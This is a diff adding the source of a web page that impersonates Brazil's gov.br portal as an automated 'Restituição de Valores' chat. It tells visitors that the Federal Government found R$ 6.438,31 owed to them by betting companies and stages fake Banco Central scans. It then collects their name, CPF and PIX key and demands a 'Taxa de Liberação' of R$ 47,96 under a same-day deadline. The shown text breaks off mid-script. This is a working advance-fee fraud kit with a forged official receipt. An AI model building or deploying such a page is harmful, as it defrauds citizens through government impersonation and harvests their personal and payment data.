@@ -1,0 +1,1056 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Utmify Pixel -->
+    <script>
+      window.pixelId = "6ad6b8c8a8d3ee2bee813a7a";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel.js"></script>
+    <!-- Utmify UTM Tracker -->
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+        <!-- Preservação de UTMs e navegação (helper único) -->
+    <script src="js/utm-helper.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no,viewport-fit=cover">
+  <title>Restituição de Valores - Atendimento</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <style>
+    :root {
+      --primary-color: #0042DA;
+      --bg-color: #ffffff;
+      --bot-bubble-bg: #F7F8FF;
+      --user-bubble-bg: #FF8E21;
+      --text-color: #303235;
+      --white: #FFFFFF;
+      --gray-light: #E5E5E5;
+      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+      --success: #168821;
+      --warning: #FF8E21;
+      --danger: #D32F2F;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+    /* Altura dinâmica: desconta a barra de ferramentas do Safari no iOS */
+    body {
+      background-color: var(--bg-color);
+      height: 100vh;        /* fallback navegadores antigos */
+      height: 100dvh;       /* iOS Safari 15.4+ / Chrome mobile */
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    header { background: var(--white); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05); z-index: 100; border-bottom: 3px solid var(--primary-color); }
+    header .logo img { height: 35px; }
+    header .user-info { background: #1451b4; color: white; padding: 5px 15px; border-radius: 20px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+
+    nav { background: var(--white); padding: 10px 20px; display: flex; align-items: center; font-size: 13px; color: #666; border-bottom: 1px solid var(--gray-light); }
+    nav i { margin: 0 8px; color: var(--primary-color); }
+
+    #chat-content {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 20px 20px calc(20px + env(safe-area-inset-bottom));
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background-color: var(--white);
+    }
+
+    .message-row { display: flex; width: 100%; }
+    .message-row.bot { justify-content: flex-start; }
+    .message-row.user { justify-content: flex-end; }
+
+    .avatar { width: 28px; height: 28px; border-radius: 50%; margin-right: 8px; flex-shrink: 0; background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwUOr1SlV6MkW-BL2YjCCmabU_q49pp8t0d5XQtqj3Wg&s=10"); background-size: cover; margin-top: 5px; }
+
+    .bubble { max-width: 85%; padding: 10px 14px; border-radius: 18px; font-size: 15px; line-height: 1.55; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); position: relative; color: #303235; }
+    .bot .bubble { background-color: var(--bot-bubble-bg); color: var(--text-color); border-top-left-radius: 2px; }
+    .user .bubble { background-color: var(--user-bubble-bg); color: white; border-top-right-radius: 2px; }
+
+    .typing { display: flex; gap: 4px; padding: 12px 18px; background: var(--bot-bubble-bg); border-radius: 18px; width: fit-content; margin-left: 36px; border-top-left-radius: 2px; }
+    .typing span { width: 8px; height: 8px; background: #999; border-radius: 50%; animation: bounce 1s infinite; }
+    .typing span:nth-child(2) { animation-delay: 0.2s; }
+    .typing span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+    #controls {
+      padding: 15px 20px calc(15px + env(safe-area-inset-bottom));
+      background: #fff;
+      border-top: 1px solid #eee;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+    #controls.active { display: flex; }
+
+    .chat-options { display: flex; flex-direction: column; gap: 10px; padding: 5px 0 5px 36px; max-width: 90%; }
+    .chat-options button { background-color: var(--primary-color); color: white; border: none; padding: 14px 24px; border-radius: 25px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.25s ease; box-shadow: 0 3px 8px rgba(0, 66, 218, 0.25); text-align: center; letter-spacing: 0.3px; position: relative; overflow: hidden; }
+    .chat-options button::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); transition: left 0.5s; }
+    .chat-options button:hover::after { left: 100%; }
+    .chat-options button:hover { background-color: #0032a8; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 66, 218, 0.35); }
+    .chat-options button:active { transform: translateY(0); box-shadow: 0 2px 4px rgba(0, 66, 218, 0.2); }
+
+    .input-wrapper { display: flex; gap: 10px; width: 100%; max-width: 400px; position: relative; }
+    .input-wrapper input { flex: 1; padding: 14px 50px 14px 20px; border: 1px solid var(--gray-light); border-radius: 30px; outline: none; font-size: 16px; background: #f9f9f9; box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02); }
+    .input-wrapper button { background: var(--primary-color); border: none; width: 40px; height: 40px; border-radius: 50%; color: white; cursor: pointer; position: absolute; right: 5px; top: 4px; }
+
+    .media-container { margin-top: 8px; border-radius: 12px; overflow: hidden; width: 100%; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); }
+    .bubble:has(.media-container), .bubble:has(.comprovante), .bubble:has(.documento-valores) { width: 85%; max-width: 85%; }
+    .media-container img { width: 100%; height: auto; display: block; }
+
+    footer { background: #001C4E; padding: 12px 12px calc(12px + env(safe-area-inset-bottom)); text-align: center; }
+    footer img { height: 22px; opacity: 0.9; }
+
+    /* ============ ANIMAÇÕES ============ */
+
+    /* Spinner */
+    .spinner-container { display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 15px; }
+    .spinner { width: 50px; height: 50px; border: 4px solid #E5E5E5; border-top: 4px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .spinner-text { font-size: 14px; color: #555; font-weight: 500; }
+
+    /* Barra de Progresso */
+    .progress-container { width: 100%; margin: 10px 0; }
+    .progress-label { display: flex; justify-content: space-between; font-size: 12px; color: #555; margin-bottom: 6px; font-weight: 600; }
+    .progress-bar-bg { width: 100%; height: 8px; background: #E5E5E5; border-radius: 10px; overflow: hidden; }
+    .progress-bar-fill { height: 100%; background: var(--primary-color); border-radius: 10px; width: 0%; transition: width 0.3s ease; }
+
+    /* Checklist */
+    .checklist { display: flex; flex-direction: column; gap: 8px; padding: 10px 0; }
+    .checklist-item { display: flex; align-items: center; gap: 10px; font-size: 14px; color: #555; opacity: 0; transform: translateX(-20px); animation: slideInCheck 0.5s ease forwards; }
+    .checklist-item .check-icon { width: 22px; height: 22px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; color: white; font-size: 12px; flex-shrink: 0; }
+    .checklist-item .check-icon::after { content: '✓'; font-weight: bold; }
+    .checklist-item.done { color: var(--success); font-weight: 600; }
+
+    @keyframes slideInCheck { to { opacity: 1; transform: translateX(0); } }
+
+    /* Success Check */
+    .success-check-container { display: flex; justify-content: center; padding: 15px; }
+    .success-check { width: 60px; height: 60px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; animation: successPop 0.5s ease; }
+    .success-check::after { content: '✓'; color: white; font-size: 32px; font-weight: bold; }
+    @keyframes successPop { 0% { transform: scale(0); } 70% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+    /* Lock */
+    .lock-animation { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 10px; color: #333; }
+    .lock-animation i { color: var(--primary-color); font-size: 18px; }
+
+    /* WhatsApp Audio Player */
+    .wa-audio-player { display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: #FFFFFF; border: 1px solid #e1e7ed; border-radius: 18px; box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04); width: 260px; max-width: 100%; user-select: none; position: relative; margin-top: 6px; }
+    .wa-play-btn { width: 38px; height: 38px; border-radius: 50%; background: #00A884; color: #fff; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; flex-shrink: 0; box-shadow: 0 2px 6px rgba(0, 168, 132, 0.35); }
+    .wa-play-btn i { font-size: 15px; margin-left: 2px; }
+    .wa-play-btn.playing i { margin-left: 0; }
+    .wa-wave-container { flex: 1; display: flex; flex-direction: column; gap: 6px; pointer-events: none; }
+    .wa-wave-bars { display: flex; align-items: center; gap: 2.5px; height: 22px; }
+    .wa-bar { width: 3px; background: #d1d7db; border-radius: 2px; transition: background-color 0.2s ease; }
+    .wa-bar.active { background: #00A884; }
+    .wa-meta { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: #8696a0; font-weight: 500; }
+    .wa-mic-icon { font-size: 14px; color: #00A884; }
+
+    /* ============ DOCUMENTO DE VALORES (NOVO DESIGN) ============ */
+    .documento-valores {
+      background: #ffffff;
+      border: 1px solid #d8dde5;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 12px 0;
+      box-shadow: 0 4px 14px rgba(0, 28, 78, 0.08);
+      width: 100%;
+      opacity: 0;
+      animation: slideUpCard 0.5s ease forwards;
+    }
+
+    @keyframes slideUpCard { to { opacity: 1; } }
+
+    .documento-header {
+      background: linear-gradient(135deg, #0042DA 0%, #001C4E 100%);
+      padding: 14px 16px;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .documento-header-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .documento-header-left i {
+      font-size: 18px;
+      opacity: 0.9;
+    }
+
+    .documento-titulo {
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .documento-protocolo {
+      font-size: 10px;
+      color: rgba(255, 255, 255, 0.8);
+      margin-top: 3px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .documento-corpo {
+      padding: 0;
+    }
+
+    .documento-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      gap: 12px;
+      border-bottom: 1px solid #f0f2f6;
+      font-size: 12px;
+      transition: background 0.2s;
+    }
+
+    .documento-item:nth-child(even) {
+      background: #fafbfd;
+    }
+
+    .documento-item:last-child {
+      border-bottom: none;
+    }
+
+    .documento-item .nome-entidade {
+      color: #333;
+      font-weight: 500;
+      line-height: 1.35;
+      flex: 1;
+      word-break: break-word;
+    }
+
+    .documento-item .valor-entidade {
+      color: #0a0a0a;
+      font-weight: 700;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .documento-total {
+      background: linear-gradient(135deg, #eef3ff 0%, #dfe8ff 100%);
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-top: 2px solid #0042DA;
+    }
+
+    .documento-total .label-total {
+      font-size: 12px;
+      font-weight: 800;
+      color: #001C4E;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+    }
+
+    .documento-total .valor-total {
+      font-size: 15px;
+      font-weight: 800;
+      color: #0042DA;
+      font-family: 'Courier New', monospace;
+      white-space: nowrap;
+    }
+
+    /* ============ COMPROVANTE ============ */
+    .comprovante { background: #fff; border: 1.5px solid #ccc; border-radius: 6px; padding: 8px 10px; font-family: 'Inter', sans-serif; font-size: 10px; color: #333; width: 100%; margin-top: 4px; }
+    .comprovante-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; border-bottom: 2px solid #0042DA; padding-bottom: 6px; }
+    .comprovante-header img { height: 24px; }
+    .comprovante-header .titulo { text-align: right; color: #001C4E; font-weight: 700; font-size: 12px; line-height: 1.2; }
+    .comprovante .campo { border: 1px solid #ccc; border-radius: 3px; padding: 2px 6px 3px; margin-bottom: 3px; position: relative; }
+    .comprovante .campo-label { font-size: 6px; color: #999; line-height: 1; margin-bottom: 0; }
+    .comprovante .campo-valor { font-weight: 600; font-size: 10px; color: #222; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .comprovante .campos-row { display: flex; gap: 2px; margin-bottom: 3px; flex-wrap: nowrap; }
+    .comprovante .campos-row .campo { flex: 1; margin-bottom: 0; min-width: 0; }
+    .comprovante .campos-row .campo .campo-valor { font-size: 8px; }
+    .comprovante .campos-row .campo.vencimento { background: #0042DA; border-color: #0042DA; }
+    .comprovante .campos-row .campo.vencimento .campo-label, .comprovante .campos-row .campo.vencimento .campo-valor { color: #fff; }
+    .comprovante .indeniza-row { display: flex; gap: 2px; margin-bottom: 5px; }
+    .comprovante .indeniza-row .campo { margin-bottom: 0; }
+    .comprovante .indeniza-row .campo:first-child { flex: 1; }
+    .comprovante .indeniza-row .campo.imposto { background: #0042DA; border-color: #0042DA; min-width: 65px; }
+    .comprovante .indeniza-row .campo.imposto .campo-label, .comprovante .indeniza-row .campo.imposto .campo-valor { color: #fff; }
+    .comprovante .tabela-header { background: #0042DA; color: #fff; padding: 4px 6px; border-radius: 4px 4px 0 0; font-weight: 700; font-size: 10px; }
+    .comprovante table { width: 100%; border-collapse: collapse; font-size: 9px; }
+    .comprovante table th { padding: 2px 3px; text-align: left; font-weight: 600; font-size: 8px; color: #555; border-bottom: 1px solid #ddd; }
+    .comprovante table td { padding: 1px 3px; border-bottom: 1px solid #f0f0f0; font-size: 9px; white-space: nowrap; }
+    .comprovante .totais-row { display: flex; justify-content: space-between; padding: 4px 6px; font-weight: 700; font-size: 11px; border-top: 2px solid #0042DA; margin-top: 2px; color: #001C4E; }
+
+    .fadeIn { animation: fadeInAnim 0.4s ease-out forwards; }
+    @keyframes fadeInAnim { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="logo"><img src="images/govbr.png"></div>
+    <div class="user-info">
+      <i class="fas fa-user-circle"></i>
+      <span id="user-display-name">Antonio</span>
+    </div>
+  </header>
+
+  <nav>
+    <i class="fas fa-bars"></i>
+    <span>Portal do Cidadão</span>
+    <i class="fas fa-chevron-right" style="font-size: 8px; margin: 0 5px;"></i>
+    <span>Restituição de Valores</span>
+  </nav>
+
+  <main id="chat-content"></main>
+  <section id="controls"></section>
+  <footer><img src="images/logo.png"></footer>
+
+  <script>
+    const chatContent = document.getElementById('chat-content');
+    const controls = document.getElementById('controls');
+    const userDisplayName = document.getElementById('user-display-name');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const userName = urlParams.get('nome') || 'Cidadão';
+    const userCPF = urlParams.get('cpf') || '***.***.***-**';
+    const userBirth = urlParams.get('nascimento') || '01/01/1980';
+    const userMae = urlParams.get('mae') || '';
+
+    userDisplayName.textContent = userName.split(' ')[0];
+
+    // Mantém todos os parâmetros originais da URL para repassar ao checkout
+    const paramsCheckout = new URLSearchParams(window.location.search);
+
+    const state = { currentStep: 0, pixType: '', pixKey: '' };
+
+    // ========== DATA ATUAL DINÂMICA ==========
+    const hoje = new Date();
+    const diaHoje = String(hoje.getDate()).padStart(2, '0');
+    const mesHoje = String(hoje.getMonth() + 1).padStart(2, '0');
+    const anoHoje = hoje.getFullYear();
+    const dataHojeFormatada = `${diaHoje}/${mesHoje}/${anoHoje}`;
+
+    // Protocolo gerado dinamicamente
+    const protocoloDinamico = `#${anoHoje}${mesHoje}${diaHoje}-${Math.floor(10000000 + Math.random() * 90000000)}`;
+
+    // ========== VALORES DAS 17 ENTIDADES ==========
+    const ENTIDADES = [
+      { nome: 'Kaizen Gaming Brasil Ltda.',              valor: 'R$ 850,00',   valorNum: 850.00 },
+      { nome: 'HS do Brasil Ltda.',                      valor: 'R$ 412,50',   valorNum: 412.50 },
+      { nome: 'SPRBT Interactive Brasil Ltda',           valor: 'R$ 320,00',   valorNum: 320.00 },
+      { nome: 'Ventmear Brasil S.A.',                    valor: 'R$ 275,80',   valorNum: 275.80 },
+      { nome: 'Esportes Gaming Brasil Ltda.',            valor: 'R$ 510,45',   valorNum: 510.45 },
+      { nome: 'Foggo Entertainment Ltda.',               valor: 'R$ 188,90',   valorNum: 188.90 },
+      { nome: 'NSX Brasil S.A.',                         valor: 'R$ 643,20',   valorNum: 643.20 },
+      { nome: 'EB Interm. e Jogos S/A.',                 valor: 'R$ 298,75',   valorNum: 298.75 },
+      { nome: 'Ana Gaming Brasil S.A.',                  valor: 'R$ 156,40',   valorNum: 156.40 },
+      { nome: 'OIG Gaming Brazil Ltda.',                 valor: 'R$ 389,60',   valorNum: 389.60 },
+      { nome: 'BPX Bets Sports Group Ltda.',             valor: 'R$ 225,15',   valorNum: 225.15 },
+      { nome: 'H2 Licensed Ltda.',                       valor: 'R$ 342,80',   valorNum: 342.80 },
+      { nome: 'Pixbet Soluções Tecc Ltda.',              valor: 'R$ 475,30',   valorNum: 475.30 },
+      { nome: 'NVBT Gaming Ltda.',                        valor: 'R$ 210,55',   valorNum: 210.55 },
+      { nome: 'SevenX Gaming S/A.',                       valor: 'R$ 285,40',   valorNum: 285.40 },
+      { nome: 'NSX Betfair Brasil S.A.',                  valor: 'R$ 398,70',   valorNum: 398.70 },
+      { nome: 'Apollo Operations Ltda.',                 valor: 'R$ 454,81',   valorNum: 454.81 }
+    ];
+
+    const VALOR_TOTAL = 6438.31;
+    const TAXA_LIBERACAO = 48.00;
+
+    // ========== AUDIO POOL ==========
+    const AUDIO_POOL = {};
+    const ALL_AUDIO_PATHS = ['media/audio1.mp3', 'media/audio2.mp3', 'media/audio3.mp3'];
+
+    ALL_AUDIO_PATHS.forEach(src => {
+      try {
+        const audio = new Audio(src);
+        audio.preload = 'auto';
+        audio.setAttribute('playsinline', 'true');
+        audio.setAttribute('webkit-playsinline', 'true');
+        AUDIO_POOL[src] = audio;
+      } catch (e) {}
+    });
+
+    // iOS: o play() audível precisa acontecer DENTRO do gesto do usuário.
+    // Toca audível e pausa imediatamente — o blip é imperceptível e
+    // libera o áudio programático para o restante da sessão.
+    function unlockAllAudios() {
+      ALL_AUDIO_PATHS.forEach(src => {
+        const audio = AUDIO_POOL[src];
+        if (audio && !audio.dataset.unlocked) {
+          try {
+            audio.muted = false;
+            audio.volume = 1;
+            const p = audio.play();
+            if (p !== undefined) {
+              p.then(() => {
+                audio.pause();
+                audio.currentTime = 0;
+                audio.dataset.unlocked = 'true';
+              }).catch(() => {});
+            } else {
+              // Navegadores antigos (play síncrono)
+              audio.pause();
+              audio.currentTime = 0;
+              audio.dataset.unlocked = 'true';
+            }
+          } catch (e) {}
+        }
+      });
+    }
+
+    // touchend é mais confiável que touchstart no iOS para desbloquear áudio
+    document.addEventListener('touchstart', unlockAllAudios, { passive: true });
+    document.addEventListener('touchend', unlockAllAudios, { passive: true });
+    document.addEventListener('click', unlockAllAudios, { passive: true });
+
+    function stopAllAudios(exceptAudio = null) {
+      Object.values(AUDIO_POOL).forEach(a => {
+        if (a !== exceptAudio && !a.paused) {
+          try { a.pause(); a.currentTime = 0; } catch (e) {}
+        }
+      });
+    }
+
+    // ========== FUNÇÕES DE ANIMAÇÃO ==========
+
+    function animationSpinner(text) {
+      return `<div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="spinner-text">${text}</div>
+      </div>`;
+    }
+
+    function animationProgress(percent, label) {
+      return `<div class="progress-container">
+        <div class="progress-label"><span>${label}</span><span>${percent}%</span></div>
+        <div class="progress-bar-bg"><div class="progress-bar-fill" style="width:${percent}%"></div></div>
+      </div>`;
+    }
+
+    function animationChecklist(items) {
+      let html = '<div class="checklist">';
+      items.forEach((item, i) => {
+        const delay = i * 0.4;
+        html += `<div class="checklist-item done" style="animation-delay: ${delay}s;">
+          <div class="check-icon"></div>
+          <span>${item}</span>
+        </div>`;
+      });
+      html += '</div>';
+      return html;
+    }
+
+    // DOCUMENTO FORMAL DE VALORES
+    function animationDocumentoValores() {
+      let items = '';
+      ENTIDADES.forEach(e => {
+        items += `<div class="documento-item">
+          <span class="nome-entidade">${e.nome}</span>
+          <span class="valor-entidade">${e.valor}</span>
+        </div>`;
+      });
+
+      return `<div class="documento-valores">
+        <div class="documento-header">
+          <div class="documento-header-left">
+            <i class="fas fa-file-invoice-dollar"></i>
+            <div>
+              <div class="documento-titulo">Relação de Valores Identificados</div>
+              <div class="documento-protocolo">Protocolo: ${protocoloDinamico}</div>
+            </div>
+          </div>
+        </div>
+        <div class="documento-corpo">
+          ${items}
+        </div>
+        <div class="documento-total">
+          <span class="label-total">Total</span>
+          <span class="valor-total">R$ 6.438,31</span>
+        </div>
+      </div>`;
+    }
+
+    function animationSuccess() {
+      return `<div class="success-check-container"><div class="success-check"></div></div>`;
+    }
+
+    function animationLock(text) {
+      return `<div class="lock-animation">
+        <i class="fas fa-shield-alt"></i>
+        <span>${text}</span>
+      </div>`;
+    }
+
+    function animationCounter(prefix = 'R$', finalValue = 6438.31) {
+      const id = 'counter_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
+      return `<span id="${id}" class="animated-counter"
+        data-target="${finalValue}"
+        data-prefix="${prefix}"
+        style="font-size:22px;font-weight:800;color:#168821;display:block;text-align:center;padding:6px 0;">R$ 0,00</span>`;
+    }
+
+    // ========== COMPROVANTE ==========
+    function generateComprovante() {
+      const dataEmissao = dataHojeFormatada;
+      const numDoc = `03.40.${Math.floor(10000 + Math.random() * 90000)}.${Math.floor(10000000 + Math.random() * 90000000)}-0`;
+
+      let linhasTabela = '';
+      ENTIDADES.forEach(e => {
+        linhasTabela += `<tr><td>${e.nome}</td><td>${e.valor}</td></tr>`;
+      });
+
+      return `<div class="comprovante">
+        <div class="comprovante-header">
+          <img src="images/govbr.png" alt="gov.br">
+          <div class="titulo">Restituição <br>de Valores</div>
+        </div>
+        <div class="campo">
+          <span class="campo-label">Nome Completo</span>
+          <div class="campo-valor">${userName}</div>
+        </div>
+        <div class="campos-row">
+          <div class="campo">
+            <span class="campo-label">Valor a receber</span>
+            <div class="campo-valor">R$ 6.438,31</div>
+          </div>
+          <div class="campo">
+            <span class="campo-label">Data da emissão</span>
+            <div class="campo-valor">${dataEmissao}</div>
+          </div>
+          <div class="campo">
+            <span class="campo-label">Nº do Documento</span>
+            <div class="campo-valor">${numDoc}</div>
+          </div>
+          <div class="campo vencimento">
+            <span class="campo-label">Vencimento</span>
+            <div class="campo-valor">${dataEmissao}</div>
+          </div>
+        </div>
+        <div class="indeniza-row">
+          <div class="campo">
+            <span class="campo-label">Origem dos Valores</span>
+            <div class="campo-valor">Plataformas Regulamentadas</div>
+          </div>
+          <div class="campo imposto">
+            <span class="campo-label">Taxa de Liberação</span>
+            <div class="campo-valor">R$ 47,96</div>
+          </div>
+        </div>
+        <div class="tabela-header">Relação de Valores Identificados</div>
+        <table>
+          <thead>
+            <tr>
+              <th>Entidade</th>
+              <th style="text-align:right;">Valor</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${linhasTabela}
+          </tbody>
+        </table>
+        <div class="totais-row">
+          <span>TOTAL</span>
+          <span>R$ 6.438,31</span>
+        </div>
+        <div style="text-align: center; margin-top: 5px; font-size: 8px; color: #666;">
+          *O saque será liberado após o pagamento da Taxa de Liberação.
+        </div>
+      </div>`;
+    }
+
+    // ========== FLUXO ==========
+    const flow = [
+      {
+        id: 'start',
+        messages: [
+          { type: 'bot', content: `Prezado(a) <strong>${userName.split(' ')[0]}</strong>, sua consulta foi iniciada com sucesso.`, delay: 1000 },
+          { type: 'bot', content: animationLock('Conexão segura estabelecida.'), delay: 2000 },
+          { type: 'bot', content: 'O sistema do Governo Federal identificou um <strong>saldo pendente</strong> vinculado ao seu CPF, proveniente de plataformas regulamentadas.', delay: 2500 },
+          { type: 'bot', content: `O prazo para solicitação dos valores é até <strong>${dataHojeFormatada}</strong>. Após esse período, os valores serão devolvidos ao Tesouro Nacional.`, delay: 2500 },
+          { type: 'bot', content: 'Deseja prosseguir com a consulta e verificar os valores disponíveis?', delay: 2000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Sim, prosseguir com a consulta', next: 'searching_bets' },
+          { label: 'Quero saber mais', next: 'explain_program' }
+        ]
+      },
+      {
+        id: 'explain_program',
+        messages: [
+          { type: 'bot', content: 'Este é um programa oficial do Governo Federal para restituir valores de plataformas regulamentadas. Cruzamos os dados do seu CPF e identificamos valores que são seus por direito.', delay: 2000 },
+          { type: 'bot', content: 'Caso a solicitação não seja concluída dentro do prazo, o sistema pode bloquear o acesso ao valor.', delay: 2500 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Prosseguir com a consulta', next: 'searching_bets' }
+        ]
+      },
+      {
+        id: 'searching_bets',
+        messages: [
+          { type: 'bot', content: animationSpinner('Iniciando varredura no sistema...'), delay: 1500 },
+          { type: 'bot', content: animationProgress(25, 'Conectando ao Banco Central'), delay: 2500 },
+          { type: 'bot', content: animationProgress(60, 'Analisando CPF na base de dados'), delay: 2500 },
+          { type: 'bot', content: animationProgress(100, 'Varredura concluída'), delay: 2500 },
+          { type: 'bot', content: animationChecklist([
+            'Entidades vinculadas ao CPF',
+            'Saldos e prêmios disponíveis',
+            'Apostas em aberto',
+            'Histórico de registros'
+          ]), delay: 3000 }
+        ],
+        type: 'auto_next',
+        next: 'bets_summary'
+      },
+      {
+        id: 'bets_summary',
+        messages: [
+          { type: 'bot', content: 'Valores localizados com sucesso.', delay: 1500 },
+          { type: 'bot', content: animationDocumentoValores(), delay: 2500 },
+          { type: 'bot', content: `Valor total identificado: ${animationCounter('R$', 6438.31)}`, delay: 2500 },
+          { type: 'bot', content: 'Para dar continuidade, é necessário confirmar seus dados de recebimento.', delay: 2000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Confirmar dados', next: 'confirm_data' }
+        ]
+      },
+      {
+        id: 'confirm_data',
+        stepDelay: 1000,
+        messages: [
+          { type: 'bot', content: '<div class="media-container"><img src="images/validado.png"></div>', delay: 3000 },
+          { type: 'bot', content: animationSuccess(), delay: 1500 },
+          { type: 'bot', content: `<strong>Autenticidade confirmada.</strong><br><br><strong>Nome:</strong> ${userName}<br><strong>CPF:</strong> ${userCPF}<br><strong>Valor a Receber:</strong> R$ 6.438,31<br><strong>Status:</strong> <span style="color: #168821; font-weight: 700;">Pré-aprovado</span>`, delay: 3000 },
+          { type: 'bot', content: '<div class="wa-audio-player" data-src="media/audio1.mp3"></div>', delay: 4000 },
+          { type: 'bot', content: 'Para liberar o PIX, é necessário confirmar sua identidade. Informe sua chave PIX para recebimento.', delay: 3000 },
+          { type: 'bot', content: 'Selecione o tipo de <strong>chave PIX</strong>:', delay: 2000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'CPF', value: 'CPF', next: 'type_pix' },
+          { label: 'Celular', value: 'Celular', next: 'type_pix' },
+          { label: 'E-mail', value: 'E-mail', next: 'type_pix' },
+        ]
+      },
+      {
+        id: 'type_pix',
+        messages: [
+          { type: 'bot', content: 'Digite sua chave Pix para receber <strong>R$ 6.438,31</strong>:', delay: 1000 }
+        ],
+        type: 'input',
+        placeholder: 'Sua chave aqui...',
+        next: 'check_pix'
+      },
+      {
+        id: 'check_pix',
+        messages: [
+          { type: 'bot', content: '<strong>Verifique se a chave PIX está correta:</strong><br><br><strong style="font-size: 18px; color: #000;" id="display-pix"></strong><br><br>O sistema não se responsabiliza por chaves informadas incorretamente.', delay: 1000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Sim, está correto', next: 'registering_pix' },
+          { label: 'Não, quero corrigir', next: 'type_pix' }
+        ]
+      },
+      {
+        id: 'registering_pix',
+        stepDelay: 800,
+        messages: [
+          { type: 'bot', content: animationSpinner('Cadastrando chave PIX no sistema...'), delay: 2000 },
+          { type: 'bot', content: '<div class="media-container"><img src="images/chavepix.png"></div>', delay: 3000 },
+          { type: 'bot', content: animationChecklist([
+            'Validando chave PIX',
+            'Verificando titularidade',
+            'Registrando no Banco Central'
+          ]), delay: 3000 },
+          { type: 'bot', content: animationSuccess(), delay: 1000 },
+          { type: 'bot', content: `<strong>Chave PIX cadastrada com sucesso.</strong><br><br><strong>Beneficiário:</strong> ${userName}<br><strong>Chave:</strong> <span id="display-pix-final" style="font-weight:700"></span><br><strong>Status:</strong> <span style="color: #168821; font-weight:700">Aprovado</span>`, delay: 2000 },
+          { type: 'bot', content: '<div class="wa-audio-player" data-src="media/audio2.mp3"></div>', delay: 1500 },
+          { type: 'bot', content: '<strong>Última etapa:</strong> clique no botão abaixo para gerar o comprovante e liberar o saque.', delay: 21000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Gerar comprovante e liberar saque', next: 'final_step' }
+        ]
+      },
+      {
+        id: 'final_step',
+        stepDelay: 1000,
+        messages: [
+          { type: 'bot', content: animationSpinner('Gerando comprovante oficial...'), delay: 2000 },
+          { type: 'bot', content: animationProgress(50, 'Processando dados finais'), delay: 2000 },
+          { type: 'bot', content: animationProgress(100, 'Comprovante pronto'), delay: 2000 },
+          { type: 'bot', content: animationSuccess(), delay: 1000 },
+          { type: 'bot', content: generateComprovante(), delay: 2000 },
+          { type: 'bot', content: `<strong>Atenção:</strong> o saque está pendente de liberação.<br><br>Para que o Banco Central processe o PIX de <strong>R$ 6.438,31</strong>, é necessário o pagamento de uma <strong>Taxa de Liberação</strong> no valor de <strong>R$ 47,96</strong>.`, delay: 2500 },
